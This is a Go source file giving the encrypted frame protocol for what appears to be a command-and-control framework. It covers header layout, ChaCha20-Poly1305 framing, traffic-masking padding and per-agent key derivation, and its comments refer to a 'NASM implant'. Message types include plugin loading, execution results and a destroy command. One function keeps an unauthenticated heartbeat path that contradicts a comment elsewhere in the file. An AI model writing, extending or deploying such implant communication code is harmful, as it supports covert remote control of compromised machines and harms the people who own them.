package protocol

import (
	"golang.org/x/crypto/chacha20"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"hash/fnv"
	"io"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

const (
	HeaderSize = 36
	Magic      = 0x46454900
	ProtoVer   = 0x0300

	TypeHeartbeat  uint16 = 0x01
	TypePluginLoad uint16 = 0x02
	TypeExecReturn uint16 = 0x03
	TypeException  uint16 = 0x04
	TypeDestroy    uint16 = 0x05

	MaxPayloadSize = 16 * 1024 * 1024
	MaxPaddingSize = 128

	SessionNonceSize = 16
)

type SessionContext struct {
	Nonce   [SessionNonceSize]byte
	Counter uint32
}

func NewSessionContext() (*SessionContext, error) {
	ctx := &SessionContext{}
	_, err := rand.Read(ctx.Nonce[:])
	if err != nil {
		return nil, fmt.Errorf("fei: generate session nonce: %w", err)
	}
	ctx.Counter = 0
	return ctx, nil
}

func (s *SessionContext) NextSeq() uint32 {
	s.Counter++
	return s.RollingHash()
}

func (s *SessionContext) RollingHash() uint32 {
	h := fnv.New32a()
	h.Write(s.Nonce[:])
	binary.Write(h, binary.LittleEndian, s.Counter)
	return h.Sum32()
}

func (s *SessionContext) ValidateSeq(seq uint32) bool {
	expected := s.RollingHash()
	return seq == expected
}

var (
	ErrBadMagic      = errors.New("fei: invalid magic")
	ErrBadVersion    = errors.New("fei: unsupported protocol version")
	ErrPayloadTooBig = errors.New("fei: payload exceeds maximum size")
	ErrDecryptFailed = errors.New("fei: chacha20-poly1305 decryption failed")
	ErrBadNonce      = errors.New("fei: invalid nonce derivation")
)

type Header struct {
	Magic      uint32
	ProtoVer   uint16
	Type       uint16
	Seq        uint32
	Length     uint32
	PaddingLen uint16
	AgentID    [8]byte
	Timestamp  [8]byte
}

func (h *Header) TypeString() string {
	switch h.Type {
	case TypeHeartbeat:
		return "heartbeat"
	case TypePluginLoad:
		return "plugin_load"
	case TypeExecReturn:
		return "exec_return"
	case TypeException:
		return "exception"
	case TypeDestroy:
		return "destroy"
	default:
		return fmt.Sprintf("unknown(0x%04x)", h.Type)
	}
}

func (h *Header) TimestampMs() uint64 {
	return binary.BigEndian.Uint64(h.Timestamp[:])
}

func EncodeHeader(h *Header) []byte {
	buf := make([]byte, HeaderSize)
	binary.LittleEndian.PutUint32(buf[0:4], h.Magic)
	binary.LittleEndian.PutUint16(buf[4:6], h.ProtoVer)
	binary.LittleEndian.PutUint16(buf[6:8], h.Type)
	binary.LittleEndian.PutUint32(buf[8:12], h.Seq)
	binary.LittleEndian.PutUint32(buf[12:16], h.Length)
	binary.LittleEndian.PutUint16(buf[16:18], h.PaddingLen)
	copy(buf[18:26], h.AgentID[:])
	copy(buf[26:34], h.Timestamp[:])
	return buf
}

func DecodeHeader(data []byte) (*Header, error) {
	if len(data) < HeaderSize {
		return nil, fmt.Errorf("fei: header too short: %d bytes", len(data))
	}
	h := &Header{}
	h.Magic = binary.LittleEndian.Uint32(data[0:4])
	h.ProtoVer = binary.LittleEndian.Uint16(data[4:6])
	h.Type = binary.LittleEndian.Uint16(data[6:8])
	h.Seq = binary.LittleEndian.Uint32(data[8:12])
	h.Length = binary.LittleEndian.Uint32(data[12:16])
	h.PaddingLen = binary.LittleEndian.Uint16(data[16:18])
	copy(h.AgentID[:], data[18:26])
	copy(h.Timestamp[:], data[26:34])
	return h, nil
}

func ValidateHeader(h *Header) error {
	if h.Magic != Magic {
		return ErrBadMagic
	}
	if h.ProtoVer != ProtoVer {
		return ErrBadVersion
	}
	if h.Length > MaxPayloadSize {
		return ErrPayloadTooBig
	}
	return nil
}

type Frame struct {
	Header  Header
	Payload []byte
}

func ReadFrame(r io.Reader) (*Frame, error) {
	headerBuf := make([]byte, HeaderSize)
	if _, err := io.ReadFull(r, headerBuf); err != nil {
		return nil, fmt.Errorf("fei: read header: %w", err)
	}

	hdr, err := DecodeHeader(headerBuf)
	if err != nil {
		return nil, err
	}
	if err := ValidateHeader(hdr); err != nil {
		return nil, err
	}

	bodySize := int(hdr.Length) + int(hdr.PaddingLen)
	_ = bodySize

	if bodySize > 0 {
		body := make([]byte, bodySize)
		if _, err := io.ReadFull(r, body); err != nil {
			return nil, fmt.Errorf("fei: read body: %w", err)
		}
		return &Frame{Header: *hdr, Payload: body[:hdr.Length]}, nil
	}

	return &Frame{Header: *hdr, Payload: nil}, nil
}

func ReadEncryptedFrame(r io.Reader, psk []byte) (*Frame, error) {
	headerBuf := make([]byte, HeaderSize)
	if _, err := io.ReadFull(r, headerBuf); err != nil {
		return nil, fmt.Errorf("fei: read header: %w", err)
	}

	hdr, err := DecodeHeader(headerBuf)
	if err != nil {
		return nil, err
	}
	if err := ValidateHeader(hdr); err != nil {
		return nil, err
	}

	// no plaintext fast path: every frame (including empty heartbeats)
	// carries an AEAD tag, so nothing unauthenticated reaches the session
	// logic

	ciphertextSize := int(hdr.Length) + chacha20poly1305.Overhead
	totalBodySize := ciphertextSize + int(hdr.PaddingLen)
	if totalBodySize > MaxPayloadSize+chacha20poly1305.Overhead+MaxPaddingSize {
		return nil, ErrPayloadTooBig
	}

	body := make([]byte, totalBodySize)
	if _, err := io.ReadFull(r, body); err != nil {
		return nil, fmt.Errorf("fei: read encrypted body: %w", err)
	}

	ciphertext := body[:ciphertextSize]

	plaintext, err := Decrypt(psk, hdr, ciphertext)
	if err != nil {
		return nil, err
	}

	return &Frame{Header: *hdr, Payload: plaintext}, nil
}

func WriteFrame(w io.Writer, frame *Frame) error {
	headerBytes := EncodeHeader(&frame.Header)
	if _, err := w.Write(headerBytes); err != nil {
		return fmt.Errorf("fei: write header: %w", err)
	}
	if len(frame.Payload) > 0 {
		padding := GeneratePadding(frame.Header.PaddingLen)
		if _, err := w.Write(frame.Payload); err != nil {
			return fmt.Errorf("fei: write payload: %w", err)
		}
		if len(padding) > 0 {
			if _, err := w.Write(padding); err != nil {
				return fmt.Errorf("fei: write padding: %w", err)
			}
		}
	}
	return nil
}

func WriteEncryptedFrame(w io.Writer, psk []byte, msgType uint16, seq uint32, agentID [8]byte, plaintext []byte) error {
	paddingLen := RandomPaddingLen()

	nonce := DeriveNonce(seq, agentID)

	headerBuf := make([]byte, HeaderSize)
	binary.LittleEndian.PutUint32(headerBuf[0:4], Magic)
	binary.LittleEndian.PutUint16(headerBuf[4:6], ProtoVer)
	binary.LittleEndian.PutUint16(headerBuf[6:8], msgType)
	binary.LittleEndian.PutUint32(headerBuf[8:12], seq)
	binary.LittleEndian.PutUint32(headerBuf[12:16], uint32(len(plaintext)))
	binary.LittleEndian.PutUint16(headerBuf[16:18], paddingLen)
	copy(headerBuf[18:26], agentID[:])
	binary.BigEndian.PutUint64(headerBuf[26:34], uint64(time.Now().UnixMilli()))

	ciphertext, err := Encrypt(psk, headerBuf, nonce, plaintext)
	if err != nil {
		return err
	}

	padding := GeneratePadding(paddingLen)

	if _, err := w.Write(headerBuf); err != nil {
		return err
	}
	if _, err := w.Write(ciphertext); err != nil {
		return err
	}
	if len(padding) > 0 {
		if _, err := w.Write(padding); err != nil {
			return err
		}
	}
	return nil
}

// DeriveAgentPSK derives the per-agent session key from the master PSK:
// the first 32 bytes of the ChaCha20 keystream (counter 0) under the
// domain-separated nonce le32(0x50534B31) || agent_id. The NASM implant
// derives the identical value at startup (derive_agent_psk), so the
// master key never encrypts traffic and one captured agent binary
// compromises only its own stream.
func DeriveAgentPSK(master []byte, agentID [8]byte) ([]byte, error) {
	nonce := make([]byte, chacha20poly1305.NonceSize)
	binary.LittleEndian.PutUint32(nonce[0:4], 0x50534B31)
	copy(nonce[4:], agentID[:])

	cipher, err := chacha20.NewUnauthenticatedCipher(master, nonce)
	if err != nil {
		return nil, fmt.Errorf("fei: init chacha20 for derivation: %w", err)
	}
	key := make([]byte, 32)
	cipher.XORKeyStream(key, key) // keystream block 0, first 32 bytes
	return key, nil
}

// ReadEncryptedFrameAgent reads the first frame of a connection and
// derives the per-agent session key from the (plaintext) header agent id
// before decrypting. Returns the frame and the derived key.
func ReadEncryptedFrameAgent(r io.Reader, master []byte) (*Frame, []byte, error) {
	headerBuf := make([]byte, HeaderSize)
	if _, err := io.ReadFull(r, headerBuf); err != nil {
		return nil, nil, fmt.Errorf("fei: read header: %w", err)
	}

	hdr, err := DecodeHeader(headerBuf)
	if err != nil {
		return nil, nil, err
	}
	if err := ValidateHeader(hdr); err != nil {
		return nil, nil, err
	}

	agentPSK, err := DeriveAgentPSK(master, hdr.AgentID)
	if err != nil {
		return nil, nil, err
	}

	if hdr.Type == TypeHeartbeat && hdr.Length == 0 && hdr.PaddingLen == 0 {
		return &Frame{Header: *hdr, Payload: nil}, agentPSK, nil
	}

	ciphertextSize := int(hdr.Length) + chacha20poly1305.Overhead
	totalBodySize := ciphertextSize + int(hdr.PaddingLen)
	if totalBodySize > MaxPayloadSize+chacha20poly1305.Overhead+MaxPaddingSize {
		return nil, nil, ErrPayloadTooBig
	}

	body := make([]byte, totalBodySize)
	if _, err := io.ReadFull(r, body); err != nil {
		return nil, nil, fmt.Errorf("fei: read encrypted body: %w", err)
	}

	plaintext, err := Decrypt(agentPSK, hdr, body[:ciphertextSize])
	if err != nil {
		return nil, nil, err
	}

	return &Frame{Header: *hdr, Payload: plaintext}, agentPSK, nil
}

func DeriveNonce(seq uint32, agentID [8]byte) []byte {
	nonce := make([]byte, chacha20poly1305.NonceSize)
	binary.LittleEndian.PutUint32(nonce[0:4], seq)
	copy(nonce[4:], agentID[:])
	return nonce
}

func Encrypt(psk []byte, headerBytes []byte, nonce []byte, plaintext []byte) ([]byte, error) {
	aead, err := chacha20poly1305.New(psk)
	if err != nil {
		return nil, fmt.Errorf("fei: init chacha20poly1305: %w", err)
	}
	return aead.Seal(nil, nonce, plaintext, headerBytes), nil
}

func Decrypt(psk []byte, hdr *Header, ciphertext []byte) ([]byte, error) {
	aead, err := chacha20poly1305.New(psk)
	if err != nil {
		return nil, fmt.Errorf("fei: init chacha20poly1305: %w", err)
	}

	nonce := DeriveNonce(hdr.Seq, hdr.AgentID)
	headerBytes := EncodeHeader(hdr)

	plaintext, err := aead.Open(nil, nonce, ciphertext, headerBytes)
	if err != nil {
		return nil, ErrDecryptFailed
	}
	return plaintext, nil
}

func GeneratePadding(length uint16) []byte {
	if length == 0 {
		return nil
	}
	padding := make([]byte, length)
	rand.Read(padding)
	return padding
}

func RandomPaddingLen() uint16 {
	buf := make([]byte, 1)
	rand.Read(buf)
	return uint16(buf[0]) % (MaxPaddingSize + 1)
}

func NewHeartbeatHeader(agentID [8]byte, seq uint32) *Header {
	h := &Header{
		Magic:      Magic,
		ProtoVer:   ProtoVer,
		Type:       TypeHeartbeat,
		Seq:        seq,
		Length:     0,
		PaddingLen: 0,
		AgentID:    agentID,
	}
	binary.BigEndian.PutUint64(h.Timestamp[:], uint64(time.Now().UnixMilli()))
	return h
}

func NewHeader(msgType uint16, seq uint32, agentID [8]byte, payloadLen uint32, paddingLen uint16) *Header {
	h := &Header{
		Magic:      Magic,
		ProtoVer:   ProtoVer,
		Type:       msgType,
		Seq:        seq,
		Length:     payloadLen,
		PaddingLen: paddingLen,
		AgentID:    agentID,
	}
	binary.BigEndian.PutUint64(h.Timestamp[:], uint64(time.Now().UnixMilli()))
	return h
}
